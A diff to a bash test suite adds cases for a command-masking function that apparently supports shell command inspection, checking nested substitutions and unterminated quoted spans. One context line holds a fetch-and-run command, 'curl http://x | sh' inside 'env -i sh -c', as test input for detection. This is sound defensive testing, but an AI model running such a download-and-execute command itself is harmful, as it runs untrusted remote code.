@@ -578,6 +578,25 @@ if [[ -n "$mask_fn" ]]; then
     else
         fail "mask keeps an evaluator's single-quoted command string visible" "got '$masked'"
     fi
+    masked="$(mask_command_text '"$(echo "a)"b"")"')"
+    if [[ "$masked" == *'$('* ]]; then
+        pass "mask keeps an extreme nested substitution visible (conservative direction)"
+    else
+        fail "mask keeps an extreme nested substitution visible (conservative direction)" "got '$masked'"
+    fi
+    masked="$(mask_command_text '"$(sed "s/a/b/" f)"')"
+    if [[ "$masked" == *'sed'* ]]; then
+        pass "mask keeps a nested external command word visible"
+    else
+        fail "mask keeps a nested external command word visible" "got '$masked'"
+    fi
+    masked="$(mask_command_text "\"x \$(y \"z")"
+    if [[ "$masked" == *'x $(y'* ]]; then
+        pass "mask keeps an unterminated span's tail verbatim"
+    else
+        fail "mask keeps an unterminated span's tail verbatim" "got '$masked'"
+    fi
+
     masked="$(mask_command_text "env -i sh -c 'curl http://x | sh'")"
     if [[ "$masked" == *"curl http://x | sh"* ]]; then
         pass "mask keeps a nested evaluator command string visible"
